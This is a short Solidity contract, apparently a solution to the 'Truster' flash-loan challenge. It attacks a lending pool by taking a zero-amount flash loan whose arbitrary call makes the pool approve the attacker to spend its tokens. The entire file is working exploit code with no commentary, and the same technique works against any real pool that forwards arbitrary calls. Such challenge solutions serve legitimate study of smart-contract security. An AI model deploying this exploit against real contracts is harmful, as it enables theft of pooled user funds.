// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract AttackTrusterLenderPool {
    function attack(address pool, address erc20, uint256 borrowAmount, address attacker) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, borrowAmount);
        IPool(pool).flashLoan(0, attacker, erc20, data);
    }
}
